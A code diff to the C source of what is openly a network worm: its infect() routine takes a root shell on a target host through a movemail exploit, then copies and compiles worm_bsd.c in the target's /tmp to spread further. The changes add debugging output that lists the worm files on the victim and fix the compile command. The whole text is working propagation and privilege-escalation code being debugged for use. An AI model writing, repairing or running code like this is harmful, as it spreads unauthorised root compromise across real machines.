@@ -125,6 +125,8 @@ void infect(ip, my_ip)
     write(sock, buf, BUF_SIZE);
     sleep(5);
 
+    write_to_sock(sock, "echo bang\n");
+
     get_root_shell_via_movemail_exploit(sock, io_buf, IO_BUF_SIZE);
     printf("[*] Should have root shell now\n");
 
@@ -151,8 +153,15 @@ void infect(ip, my_ip)
     sleep(12);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
 
+    printf("[*] DEBUG: Checking /tmp contents on target...\n");
+    write_to_sock(sock, "ls -l /tmp/worm_bsd*\n");
+    sleep(2);
+    bzero(io_buf, IO_BUF_SIZE);
+    read_from_sock(sock, io_buf, IO_BUF_SIZE);
+    printf("--- TARGET /TMP CONTENTS ---\n%s\n----------------------------\n", io_buf);
+
     printf("[*] Compiling worm_bsd.c on target\n");
-    write_to_sock(sock, "cc /tmp/worm_bsd.c -o /tmp/worm_bsd\n");
+    write_to_sock(sock, "cd /tmp; cc worm_bsd.c -o worm_bsd\n");
     sleep(2);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
     
